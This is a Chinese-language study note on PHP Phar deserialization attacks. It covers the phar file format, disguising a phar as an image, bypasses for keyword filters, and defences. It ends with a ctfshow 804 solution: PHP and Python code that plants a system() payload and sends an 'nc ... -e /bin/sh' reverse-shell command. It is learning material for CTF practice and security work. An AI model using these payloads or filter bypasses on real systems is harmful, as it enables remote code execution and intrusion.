# Phar反序列化

利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在**文件系统函数**（file_exists()、is_dir()等）参数可控的情况下，配合**phar://伪协议**，可以不依赖unserialize()直接进行反序列化操作

## 什么是phar

phar是php提供的一类文件的后缀名称，也是php伪协议的一种

* 一种文件后缀
* 一种协议名称

## phar能干什么

* 将多个php文件合并成一个独立的压缩包，相对独立
* 不用解压到硬盘即可运行php脚本
* 支持web服务器和命令行运行

## phar如何使用

文件包含~回忆
```php
include "flag.php"
```

其实php底层是这么处理的:
```php
include "file://flag.php"
```

所以要使用phar包里面的文件，相应使用phar协议进行包含
```php
include "phar://com.ctfshow.fileUtil.phar/file.php"
```

类似java的jar包
```java
import java.util.HashMap;
// 引入util.jar,使用里面的HashMap类,先声明出来,后面要用
include "phar://com.ctfshow.fileUtil.phar/file.php"
// 引入com.ctfshow.fileUtil.phar包，使用里面的file.php,先声明出来,后面要用
```

## Phar文件结构

> 1.a stub 可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件 
>
> 2.a manifest describing the contents， phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以**序列化的形式存储用户自定义的meta-data**，这是上述攻击手法最核心的地方 
>
> 3.the file contents 被压缩文件的内容 
>
> 4.[optional] a signature for verifying Phar integrity (phar file format only) 签名，放在文件末尾

### 生成phar文件

```php
<?php
    class TestObject {
    	public $value = 'test';
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest，setMetadata()会将对象进行序列化
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

注：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件，注意不要忘记去掉前面的注释分号
010Editor打开phar.phar，可以看到meta-data是以序列化的形式存储的

![image-20220807173833693](F:\PRIVATE\安全笔记\Resources\image-20220807173833693.png)

有序列化数据必然会有反序列化操作，php一大部分的[文件系统函数](http://php.net/manual/en/ref.filesystem.php)在通过`phar://`伪协议解析phar文件时，都会将meta-data进行反序列化

![image-20220807174039643](F:\PRIVATE\安全笔记\Resources\image-20220807174039643.png)
phar底层代码：![
](F:\PRIVATE\安全笔记\Resources\image-20220807174152165.png)

Demo测试：
```php
<?php
class TestObject
{
    public $value;
    public function __destruct(){
        echo 'Destruct called';
    }
}
$filename = 'phar://phar.phar/test.txt';
file_get_contents($filename);
// file_exists($filename); 其他文件函数亦然
// highlight_file($filename);
// Destruct called
```

当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作

### 将phar伪造成其他格式的文件

php识别phar文件是通过其文件头的stub，更确切一点来说是`__HALT_COMPILER();?>`这段代码，对前面的内容或者后缀名是没有要求的，可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。采用这种方法可以绕过很大一部分上传检测

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```



### 实际利用

利用条件

* phar文件能够上传到服务器
* 有可用的魔术方法作为跳板
* 文件操作函数的参数可控，且`phar`、`:`、`/`等特殊字符没有被过滤

### 防御

* 在文件系统函数的参数可控时，对参数进行严格的过滤
* 严格检查上传文件的内容，而不是只检查文件头
* 在条件允许的情况下禁用可执行系统命令、代码的危险函数

## Phar协议文件包含

很多网站都采用单一入口模式来作为网站文件加载模式

```php
<?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET['r']); //接收文件名
$action=$file==''?'index':$file; //判断为空或者等于index
include($action.'.php'); //载入相应文件
?>
```

> 此处就存在文件包含漏洞，可以利用伪协议读取文件源码，但是只能访问php文件
> r=php://filter/convert.base64-encode/resource=index

若该网站同时存在上传图片的功能，这时就可以利用phar反序列化漏洞【没错，include()也能触发反序列化】

## 绕过phar关键字检测

> // Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。
> 可以使用compress.bzip2://和compress.zlib://绕过 
> compress.bzip://phar:///test.phar/test.txt 
> compress.bzip2://phar:///home/sx/test.phar/test.txt 
> compress.zlib://phar:///home/sx/test.phar/test.txt 
> php://filter/resource=phar:///test.phar/test.txt // 
> 还可以使用伪协议的方法绕过 php://filter/read=convert.base64-encode/resource=phar://phar.phar

绕过__HALT_COMPILER特征检测

```php
if (preg_match("/</?|php|HALT_COMPILER/i",$filename){
    die();
}
```

将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了`__HALT_COMPILER()`，将 phar.gz 后缀改为 png（png文件可以上传），文件上传成功后，利用文件包含漏洞包含文件

## ctfshow 804

```php
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

题目中有可利用的类，并且没有unserialize，有unlink、file_put_contents，联想到phar反序列化

```php
<?php
class hacker{
    public $code;
}
$a=new hacker();
$a->code='system($_POST[0]);';
$phar = new phar("evil.phar");
$phar->startBuffering();
$phar->setMetadata($a);
$phar -> setStub('<?php __HALT_COMPILER();?>');
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

```python
import requests

url = "http://6e53ca54-bed6-4653-9021-10251c3b0265.challenge.ctf.show/"
data1 = {'file': '/tmp/a.phar', 'content': open('evil.phar', 'rb').read()}
data2 = {'file': 'phar:///tmp/a.phar', 'content': '123', '0': 'nc ip port -e /bin/sh'}
requests.post(url, data=data1)
r = requests.post(url, data=data2)
print(r.text)
```

